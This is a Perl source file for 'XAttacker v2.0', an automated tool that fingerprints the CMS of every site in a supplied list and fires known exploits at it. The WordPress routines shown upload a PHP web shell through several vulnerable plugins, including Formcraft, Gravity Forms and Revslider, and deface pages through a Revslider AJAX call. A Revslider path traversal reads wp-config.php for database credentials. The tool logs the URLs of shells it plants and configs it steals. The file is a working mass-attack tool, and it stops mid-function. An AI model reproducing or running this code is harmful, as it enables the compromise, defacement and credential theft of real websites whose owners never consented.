#!/usr/bin/perl

#Coded By Mohamed Riahi 10/10/2017
#don't Change my Fucking Rights

if ($^O =~ /MSWin32/) { use Win32::Console::ANSI; }
use Getopt::Long;
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Time::localtime;
my $ua = LWP::UserAgent->new;
$ua->timeout(10);

GetOptions(
    "l|list=s" => \$list,
);

unless ($list) { help(); }


sub help {
print q(
Usage:  perl XAttacker.pl -l list.txt
OPTIONS:
   -l   => websites list
);
exit;}

my $datetime = localtime;
my ($month, $year) = ($datetime->month, $datetime->year);

system("title X Attacker v2.0");
if ($^O =~ /MSWin32/) { system("cls"); } else { system("clear"); }
print color('bold green');

$tmp="tmp";
if (-e $tmp) {} else {mkdir $tmp or die "Error creating directory: $tmp"; }

$rez="Result";
if (-e $rez) {} else { mkdir $rez or die "Error creating directory: $rez"; }


print q(
             .o oOOOOOOOo                                            OOOo
             Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
             OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
             OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
             `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
             .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
             OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
            oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
           oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
          OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
          "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
             Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
             :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?
                          oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                          '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                               `$"  `OOOO' `O"Y ' `OOOO'  o
                                      OP"          : o
);

print color('reset');
print "                       ";
print colored ("[ X Attacker v2.0 ]",'white on_red');
print colored ("[ Coded By Mohamed Riahi ]\n",'white on_red');
print "                           ";
print colored ("[ Start At $datetime ]",'white on_red'),"\n\n";

$a = 0;
open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;


print color("bold white"), "[+] Total sites : ";
print color("bold red"), "".scalar(@TARGETS)."\n\n";
print color('reset');

OUTER: foreach $site(@TARGETS){
chomp($site);
$a++;
cms();
}

################ CMS DETECTOR #####################
sub cms() {
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$lokomedia = "$site/smiley/1.gif";
my $lokomediacms = $ua->get("$lokomedia")->content_type;
$loko = "$site/rss.xml";
my $lokomediacmstow = $ua->get("$loko")->content;
my $cms = $ua->get("$site")->content;

if($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "Joomla\n\n";
    print color('reset');
    open(save, '>>tmp/joomla.txt');
    print save "$site\n";
    close(save);
  comjce();
  comedia();
  comjdownloads();
  comfabrik();
  foxcontact();
  comadsmanager();
  comblog();
  comusers();
  comweblinks();
  mod_simplefileupload();
}
elsif($cms =~/wp-content|wordpress|xmlrpc.php/) {
    print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "WordPress\n\n";
    print color('reset');
    open(save, '>>tmp/Wordpress.txt');
    print save "$site\n";
    close(save);
    addblockblocker();
    blaze();
    catpro();
    cherry();
    downloadsmanager();
    formcraft();
    powerzoomer();
    gravityforms();
    revslider();
    getconfig();
    showbiz();
    ads();
    slideshowpro();
    wpmobiledetector();
    wysija();
    inboundiomarketing();
    dzszoomsounds();
    reflexgallery();
    sexycontactform();
    wtffu();
    wpjm();
    phpeventcalendar();
    synoptic();
    Wpshop();
    wpinjection();
}
elsif($cms =~/Drupal|drupal|sites\/all|drupal.org/) {
    print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "DruPal\n\n";
    print color('reset');
    open(save, '>>tmp/drupal.txt');
    print save "$site\n";
    close(save);
drupal();
}
elsif($cms =~/Prestashop|prestashop/) {
    print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "Prestashop\n\n";
    print color('reset');
    open(save, '>>tmp/Prestashop.txt');
    print save "$site\n";
    close(save);



columnadverts();
soopamobile();
soopabanners();
vtermslideshow();
simpleslideshow();
productpageadverts();
homepageadvertise();
homepageadvertise2();
jro_homepageadvertise();
attributewizardpro();
oneattributewizardpro();
attributewizardproOLD();
attributewizardpro_x();
advancedslider();
cartabandonmentpro();
cartabandonmentproOld();
videostab();
wg24themeadministration();
fieldvmegamenu();
wdoptionpanel();
pk_flexmenu();
pk_vertflexmenu();
nvn_export_orders();
megamenu();
tdpsthemeoptionpanel();
psmodthemeoptionpanel();
masseditproduct();
}

elsif($lokomediacms =~/image\/gif/) {
print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "Lokomedia\n\n";
    print color('reset');
    open(save, '>>tmp/lokomedia.txt');
    print save "$site\n";
    close(save);
    lokomedia();
}
elsif($lokomediacmstow =~/lokomedia/) {
print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "Lokomedia\n\n";
    print color('reset');
    open(save, '>>tmp/lokomedia.txt');
    print save "$site\n";
    close(save);
    lokomedia();
}

else{
print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "Unknown\n\n";
    open(save, '>>tmp/Unknown.txt');
    print color('reset');
    print save "$site\n";
    close(save);
}
}

################ Adblock Blocker #####################
sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["XAttacker.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/XAttacker.php?X=Attacker";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";
print color('bold white')," ................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $addblockup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Adblock Blocker";
print color('bold white')," ................... ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";}
}

################ Blaze #####################
sub blaze(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XAttacker.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/XAttacker.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/XAttacker.php?X=Attacker";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Blaze";
print color('bold white')," ............................. ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $blazeup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Blaze";
print color('bold white')," ............................. ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";
}
}

################ Catpro #####################
sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XAttacker.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/XAttacker.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/XAttacker.php?X=Attacker";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Catpro";
print color('bold white')," ............................ ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $catproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Catpro";
print color('bold white')," ............................ ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";
}
}


################ Cherry Plugin #####################
sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/XAttacker.php?X=Attacker";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Cherry Plugin";
print color('bold white')," ..................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cherryup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Cherry Plugin";
print color('bold white')," ..................... ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";
}
}

################ Download Manager #####################
sub downloadsmanager(){
$downloadsmanagervuln="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["XAttacker.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/XAttacker.php?X=Attacker";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Download Manager";
print color('bold white')," .................. ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dmup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Download Manager";
print color('bold white')," .................. ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";
}
}

################ Formcraft #####################
sub formcraft(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $shell ="XAttacker.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/XAttacker.php?X=Attacker";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Formcraft";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $formcraftup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$formcraftup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Formcraft";
print color('bold white')," ......................... ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";
}
}

################ Power Zoomer #####################
sub powerzoomer(){
my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XAttacker.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/XAttacker.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/XAttacker.php?X=Attacker";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Power Zoomer";
print color('bold white')," ...................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Power Zoomer";
print color('bold white')," ...................... ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";
}
}

################ Gravity Forms #####################
sub gravityforms(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["BackDoor.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);

$gravityformsup = "$site/wp-includes/wp-footer.php?X=Attacker";
my $check = $ua->get("$site/wp-content/uploads/_input_3_css.php.jd")->content;
my $checkk = $ua->get("$site/wp-includes/wp-footer.php")->content;
if($checkk =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $gravityformsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
}
else{
gravityforms2();
}
}
################ Gravity Forms #####################
sub gravityforms2(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["index.jpg"], form_id => '1', name => 'Psyco.html', gform_unique_id => '../../../../../', field_id => '3',]);
$gravityformsupp = "$site/_input_3_Psyco.html";
my $checkgravityformsupp = $ua->get("$gravityformsupp")->content;
if ($checkgravityformsupp =~ /HaCKeD/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold red'),"Shell Not Uploaded\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Link] => $gravityformsupp\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$gravityformsupp\n";
close (TEXT);

}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";
print color('bold white')," ..................... ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";
}
}

################ Revslider upload shell #####################
sub revslider(){

my $url = "$site/wp-admin/admin-ajax.php";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $revslidres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["XAttackerevs.zip"]]);

my $revs = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revavada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revstriking = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revincredible = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revmedicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revcentum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revbeachapollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revcuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revpindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revdesignplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revrarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;
my $revandre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php")->content;

if($revs =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revavada =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}


elsif($revstriking =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revincredible =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revmedicate =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revultimatum =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revcentum =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revbeachapollo =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revcuckootap =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revpindol =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revdesignplus =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revrarebird =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

elsif($revandre =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";
print color('bold white')," ......................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/XAttacker.php?X=Attacker\n";
close (TEXT);
}

else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Upload Shell";
print color('bold white')," ............ ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";
revsliderajax();
}
}
################ Revslider ajax #####################
sub revsliderajax(){

my $url = "$site/wp-admin/admin-ajax.php";

my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>HaCKeD BY Mohamed Riahi<b>"]);

$revsliderajax = $site . '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

my $checkrevsajax = $ua->get("$revsliderajax")->content;
if($checkrevsajax =~ /HaCKeD/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," ............. ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Defaced Successfully\n";
print color('bold white'),"  [Link] => $revsliderajax\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$revsliderajax\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," ............. ";
print color('bold red'),"NOt VULN";
print color('bold white'),"\n";
}
}

sub getconfig{
$url = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get Config";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
     open(save, '>>Result/Config.txt');
    print save "[RevsliderConfig] $url\n";
    close(save);
    getcpconfig();
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get Config";
print color('bold white')," .............. ";
print color('bold red'),"NOt VULN\n";
}
}

sub getcpconfig{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
